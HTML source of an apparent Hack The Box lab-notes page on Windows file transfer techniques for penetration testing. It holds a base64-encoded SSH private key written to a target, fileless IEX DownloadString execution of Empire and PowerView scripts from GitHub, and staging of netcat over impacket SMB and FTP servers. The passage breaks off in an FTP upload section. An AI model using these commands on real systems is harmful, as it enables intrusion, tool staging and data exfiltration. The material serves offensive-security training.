&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tb&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;IO.File]::WriteAllBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ublic&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d_rsa&quot;&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Convert]::FromBase64String&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, we can confirm if the file was transferred successfully using the &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2&quot;&gt;Get-FileHash&lt;/a&gt; cmdlet, which does the same thing that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5sum&lt;/code&gt; does.&lt;/p&gt;

&lt;h4 id=&quot;confirming-the-md5-hashes-match&quot;&gt;Confirming the MD5 Hashes Match&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-FileHash&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\Public\id_rsa&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Algorithm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Algorithm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Hash&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                                                                   &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;---------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                                                                   &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MD5&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;4E301756A07DED0A2DD6953ABF015278&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                                       &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\Public\id_rsa&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; While this method is convenient, it’s not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.&lt;/p&gt;

&lt;h2 id=&quot;powershell-web-downloads&quot;&gt;PowerShell Web Downloads&lt;/h2&gt;

&lt;p&gt;Most companies allow &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.&lt;/p&gt;

&lt;p&gt;PowerShell offers many file transfer options. In any version of PowerShell, the &lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0&quot;&gt;System.Net.WebClient&lt;/a&gt; class can be used to download a file over &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;. The following &lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0&quot;&gt;table&lt;/a&gt; describes WebClient methods for downloading data from a resource:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Method&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0&quot;&gt;OpenRead&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Returns the data from a resource as a &lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0&quot;&gt;Stream&lt;/a&gt;.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0&quot;&gt;OpenReadAsync&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Returns the data from a resource without blocking the calling thread.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0&quot;&gt;DownloadData&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Downloads data from a resource and returns a Byte array.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0&quot;&gt;DownloadDataAsync&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Downloads data from a resource and returns a Byte array without blocking the calling thread.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0&quot;&gt;DownloadFile&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Downloads data from a resource to a local file.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0&quot;&gt;DownloadFileAsync&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Downloads data from a resource to a local file without blocking the calling thread.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0&quot;&gt;DownloadString&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Downloads a String from a resource and returns a String.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0&quot;&gt;DownloadStringAsync&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Downloads a String from a resource without blocking the calling thread.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Let’s explore some examples of those methods for downloading files using PowerShell.&lt;/p&gt;

&lt;h4 id=&quot;powershell-downloadfile-method&quot;&gt;PowerShell DownloadFile Method&lt;/h4&gt;

&lt;p&gt;We can specify the class name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Net.WebClient&lt;/code&gt; and the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DownloadFile&lt;/code&gt; with the parameters corresponding to the URL of the target file to download and the output file name.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tb&amp;gt; &lt;span class=&quot;c&quot;&gt;# Example: (New-Object Net.WebClient).DownloadFile(&apos;&amp;lt;Target File URL&amp;gt;&apos;,&apos;&amp;lt;Output File Name&amp;gt;&apos;)&lt;/span&gt;
PS C:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tb&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;C:\Users\Public\Downloads\PowerView.ps1&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

PS C:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tb&amp;gt; &lt;span class=&quot;c&quot;&gt;# Example: (New-Object Net.WebClient).DownloadFileAsync(&apos;&amp;lt;Target File URL&amp;gt;&apos;,&apos;&amp;lt;Output File Name&amp;gt;&apos;)&lt;/span&gt;
PS C:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tb&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadFileAsync&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;C:\Users\Public\Downloads\PowerViewAsync.ps1&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;powershell-downloadstring---fileless-method&quot;&gt;PowerShell DownloadString - Fileless Method&lt;/h4&gt;

&lt;p&gt;As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2&quot;&gt;Invoke-Expression&lt;/a&gt; cmdlet or the alias &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IEX&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tb&amp;gt; IEX &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;https://raw.githubusercontent.com/EmpireProject/Empire/maste
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;smb-downloads&quot;&gt;SMB Downloads&lt;/h2&gt;
&lt;p&gt;#impacket-smbserver&lt;/p&gt;

&lt;p&gt;The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.&lt;/p&gt;

&lt;p&gt;We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py&quot;&gt;smbserver.py&lt;/a&gt; from Impacket and then use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;move&lt;/code&gt;, PowerShell &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Copy-Item&lt;/code&gt;, or any other tool that allows connection to SMB.&lt;/p&gt;

&lt;h4 id=&quot;create-the-smb-server&quot;&gt;Create the SMB Server&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;impacket-smbserver share &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;or&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;impacket-smbserver share &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; /tmp/smbshare &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-password&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test

&lt;/span&gt;Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;copy-a-file-from-the-smb-server&quot;&gt;Copy a File from the SMB Server&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\htb&amp;gt; copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;mount-the-smb-server-with-username-and-password&quot;&gt;Mount the SMB Server with Username and Password&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\htb&amp;gt; net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb&amp;gt; copy n:\nc.exe
        1 file(s) copied.
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;ftp-downloads&quot;&gt;FTP Downloads&lt;/h2&gt;

&lt;p&gt;Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; pyftpdlib &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt; 21  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I 2025-03-29 19:17:05] concurrency model: async  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I 2025-03-29 19:17:05] masquerade &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NAT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; address: None  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I 2025-03-29 19:17:05] passive ports: None  
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I 2025-03-29 19:17:05] &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; starting FTP server on 0.0.0.0:21, &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9163 &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;transferring-files-from-an-ftp-server-using-powershell&quot;&gt;Transferring Files from an FTP Server Using PowerShell&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ftp://192.168.49.128/file.txt&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;C:\Users\Public\ftp-file.txt&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;create-a-command-file-for-the-ftp-client-and-download-the-target-file&quot;&gt;Create a Command File for the FTP Client and Download the Target File&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\htb&amp;gt; echo open 192.168.49.128 &amp;gt; ftpcommand.txt
C:\htb&amp;gt; echo USER anonymous &amp;gt;&amp;gt; ftpcommand.txt
C:\htb&amp;gt; echo binary &amp;gt;&amp;gt; ftpcommand.txt
C:\htb&amp;gt; echo GET file.txt &amp;gt;&amp;gt; ftpcommand.txt
C:\htb&amp;gt; echo bye &amp;gt;&amp;gt; ftpcommand.txt

C:\htb&amp;gt; ftp -v -n -s:ftpcommand.txt
ftp&amp;gt; open 192.168.49.128
Log in with USER and PASS first.
ftp&amp;gt; USER anonymous

ftp&amp;gt; GET file.txt
ftp&amp;gt; bye

C:\htb&amp;gt;more file.txt
This is a test file
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;ftp-uploads&quot;&gt;FTP Uploads&lt;/h2&gt;

&lt;p&gt;Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pyftpdlib&lt;/code&gt;, we need to specify the option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--write&lt;/code&gt; to allow clients to upload files to our attack host.&lt;/p&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; pyftpdlib &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt; 21 &lt;span class=&quot;nt&quot;&gt;--write&lt;/span&gt;

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;write permissions assigned to anonymous user.&quot;&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I 2022-05-18 10:33:31] concurrency model: async
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I 2022-05-18 10:33:31] masquerade &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NAT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; address: None
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I 2022-05-18 10:33:31] passive ports: None
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I 2022-05-18 10:33:31] &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; starting FTP server on 0.0.0.0:21, &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5155 &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now let’s use the PowerShell upload function to upload a file to our FTP Server.&lt;/p&gt;

&lt;h4 id=&quot;powershell-upload-file&quot;&gt;PowerShell Upload File&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

